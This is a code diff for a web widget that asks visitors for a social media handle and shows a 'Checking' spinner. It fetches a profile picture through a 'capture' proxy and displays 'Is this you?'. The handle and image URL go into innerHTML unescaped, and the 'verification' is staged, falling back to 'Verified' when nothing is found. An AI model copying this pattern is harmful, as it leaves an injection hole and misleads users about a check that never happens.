@@ -329,7 +329,7 @@
       setTimeout(function () { input.focus(); }, 100);
     }
 
-    // ── State: Verifying spinner ──
+    // ── State: Verifying spinner + avatar fetch ──
     function renderVerifying(handle) {
       var myGen = verifyGen;
       card.innerHTML =
@@ -338,17 +338,48 @@
         '<div class="ig-gate-spinner"></div>' +
         '<p class="ig-gate-status">Checking ' + cfg.prefix + handle + '</p>';
 
-      setTimeout(function () {
-        if (myGen !== verifyGen) return;
-        renderConfirmation(handle);
-      }, 1500);
+      var done = false;
+      var avatarUrl = null;
+      var fetchDone = false;
+      var minTimerDone = false;
+
+      // Try to fetch real profile pic via server-side proxy
+      fetch(CAPTURE_URL + '?avatar=' + encodeURIComponent(handle) + '&platform=' + platformKey)
+        .then(function (r) { return r.ok ? r.json() : null; })
+        .then(function (data) {
+          if (data && data.avatarUrl) {
+            // Preload the image in browser before showing
+            var img = new Image();
+            img.onload = function () { avatarUrl = data.avatarUrl; fetchDone = true; checkReady(); };
+            img.onerror = function () { fetchDone = true; checkReady(); };
+            img.src = data.avatarUrl;
+          } else {
+            fetchDone = true; checkReady();
+          }
+        })
+        .catch(function () { fetchDone = true; checkReady(); });
+
+      // Minimum spinner time: 1.5s
+      setTimeout(function () { minTimerDone = true; checkReady(); }, 1500);
+      // Hard timeout: 5s — if proxy or image still loading, give up
+      setTimeout(function () { fetchDone = true; checkReady(); }, 5000);
+
+      function checkReady() {
+        if (done || myGen !== verifyGen || !minTimerDone || !fetchDone) return;
+        done = true;
+        if (avatarUrl) {
+          renderConfirmation(handle, avatarUrl);
+        } else {
+          // Fallback: skip "Is this you?" → go straight to Verified
+          renderVerified(handle);
+        }
+      }
     }
 
-    // ── State: "Is this you?" with initial-letter avatar ──
-    function renderConfirmation(handle) {
-      var initial = handle.charAt(0).toUpperCase();
+    // ── State: "Is this you?" with real profile pic ──
+    function renderConfirmation(handle, avatarUrl) {
       card.innerHTML =
-        '<div class="ig-gate-avatar ig-gate-initial" style="background:' + cfg.gradient + '"><span>' + initial + '</span></div>' +
+        '<div class="ig-gate-avatar"><img src="' + avatarUrl + '" alt=""></div>' +
         '<h2 class="ig-gate-title">Is this you?</h2>' +
         '<p class="ig-gate-handle">' + cfg.prefix + handle + '</p>' +
         '<button class="ig-gate-btn" style="background:' + cfg.gradient + ';' + btnColor + '">Yes, that\'s me</button>' +
